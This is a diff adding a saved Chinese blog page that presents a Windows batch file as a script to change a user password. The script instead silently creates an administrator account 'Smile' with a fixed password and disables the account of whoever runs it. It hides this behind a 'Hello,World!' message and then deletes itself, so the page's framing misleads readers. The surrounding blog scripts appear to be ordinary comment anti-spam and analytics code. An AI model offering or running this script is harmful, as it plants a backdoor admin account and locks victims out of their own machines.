@@ -1,0 +1,239 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>BAT 脚本修改用户密码 - Strval</title>
+
+    <!-- 使用url函数转换相关路径 -->
+    <link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/normalize/8.0.1/normalize.min.css">
+    <link rel="stylesheet" href="/usr/themes/simple/style.css">
+
+    <!--[if lt IE 9]>
+    <script src="https://cdn.bootcdn.net/ajax/libs/html5shiv/3.6.1/html5shiv.min.js"></script>
+    <script src="https://cdn.bootcdn.net/ajax/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="保存为xxx.bat文件,双击就可以运行了@echo offmd %WinDir%\System32\test_permissions%random%  || echo 请使用右键 &amp;quot;..." />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="simple" />
+<link rel="pingback" href="/action/xmlrpc" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="/action/xmlrpc" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="/action/xmlrpc" />
+<link rel="alternate" type="application/rss+xml" title="BAT 脚本修改用户密码 &raquo; Strval &raquo; RSS 2.0" href="/feed/archives/30.html" />
+<link rel="alternate" type="application/rdf+xml" title="BAT 脚本修改用户密码 &raquo; Strval &raquo; RSS 1.0" href="/feed/rss/archives/30.html" />
+<link rel="alternate" type="application/atom+xml" title="BAT 脚本修改用户密码 &raquo; Strval &raquo; ATOM 1.0" href="/feed/atom/archives/30.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-30'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-30'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-30'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _UrtBBk = //'6'
+'e1'+//'W'
+'1d0'+//'Wl'
+'2d'+'d'//'nw'
++/* 'C'//'C' */''+'0'//'U'
++//'pK'
+'99'+//'f'
+'95b'+/* 'KW'//'KW' */''+//'jb'
+'87d'+//'r'
+'37'+//'ey'
+'aa'+/* 'l4'//'l4' */''+//'U0'
+'38'+''///*'U2D'*/'U2D'
++'813'//'oG0'
++//'xYX'
+'fd'+'TN'//'TN'
++'bd'//'Qt'
++'cd'//'RW'
+, _0Z66f = [[28,30]];
+    
+    for (var i = 0; i < _0Z66f.length; i ++) {
+        _UrtBBk = _UrtBBk.substring(0, _0Z66f[i][0]) + _UrtBBk.substring(_0Z66f[i][1]);
+    }
+
+    return _UrtBBk;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script></head>
+<body>
+<!--[if lt IE 8]>
+    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
+<![endif]-->
+
+<nav>
+    <a href="/">首页</a>
+            <a href="/52.html" title="归档">归档</a>
+        <a href="/75.html" title="分类">分类</a>
+        <a href="/76.html" title="标签">标签</a>
+        <a href="/44.html" title="链接">链接</a>
+        <a href="/start-page.html" title="关于">关于</a>
+    </nav>
+
+<header>
+    <h1>BAT 脚本修改用户密码</h1>
+</header>
+<article>
+    <p>保存为xxx.bat文件,双击就可以运行了</p><pre><code>@echo off
+md %WinDir%\System32\test_permissions%random%  || echo 请使用右键 &quot;以管理员身份运行&quot; &amp;&amp; echo. &amp;&amp; pause &amp;&amp; exit
+net user Smile 102400 /add &amp;&amp; net localgroup administrators Smile /add &amp;&amp; net user %username% /active:no
+cls &amp;&amp; echo Hello,World! &amp;&amp; pause &amp;&amp; del %0
+</code></pre>
+    <ul class="page-navigator">
+        <li>Prev: <a href="/archives/29.html" title="CentOS 7.5 搭建 Shadowsocks">CentOS 7.5 搭建 Shadowsocks</a></li>
+        <li>Next: <a href="/archives/31.html" title="PHP 命令行的使用">PHP 命令行的使用</a></li>
+    </ul>
+</article><!-- end #main-->
+
+<div id="comments">
+        
+        <div id="respond-post-30" class="respond">
+        <div class="cancel-comment-reply">
+        <a id="cancel-comment-reply-link" href="/archives/30.html" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>        </div>
+    
+    	<h3 id="response">添加新评论</h3>
+    	<form method="post" action="http://strval.com/archives/30.html/comment" id="comment-form" role="form">
+                		<p>
+                <label for="author" class="required">称呼</label>
+    			<input type="text" name="author" id="author" class="text" value="" required />
+    		</p>
+    		<p>
+                <label for="mail" class="required">Email</label>
+    			<input type="email" name="mail" id="mail" class="text" value="" required />
+    		</p>
+    		<p>
+                <label for="url">网站</label>
+    			<input type="url" name="url" id="url" class="text" placeholder="http://" value="" />
+    		</p>
+                		<p>
+                <label for="textarea" class="required">内容</label>
+                <textarea rows="8" cols="50" name="text" id="textarea" class="textarea" style="max-width: 100%;" required></textarea>
+            </p>
+    		<p>
+                <button type="submit" class="submit">提交评论</button>
+            </p>
+    	</form>
+    </div>
+    </div>
+
+<footer>
+	&copy; 2022 <a href="/">Strval</a>.
+    由 <a href="http://www.typecho.org">Typecho</a> 强力驱动.
+<script src="/usr/themes/simple/say.js"></script>
+</footer><!-- end #footer -->
+
+
+
+<script>
+!function(p){"use strict";!function(t){var s=window,e=document,i=p,c="".concat("https:"===e.location.protocol?"https://":"http://","sdk.51.la/js-sdk-pro.min.js"),n=e.createElement("script"),r=e.getElementsByTagName("script")[0];n.type="text/javascript",n.setAttribute("charset","UTF-8"),n.async=!0,n.src=c,n.id="LA_COLLECT",i.d=n;var o=function(){s.LA.ids.push(i)};s.LA?s.LA.ids&&o():(s.LA=p,s.LA.ids=[],o()),r.parentNode.insertBefore(n,r)}()}({id:"JOzPdC1KgEXnm5aN",ck:"JOzPdC1KgEXnm5aN"});
+console.log("https://v6.51.la/land/JOzPdC1KgEXnm5aN");
+</script>
+
+</body>
+</html>
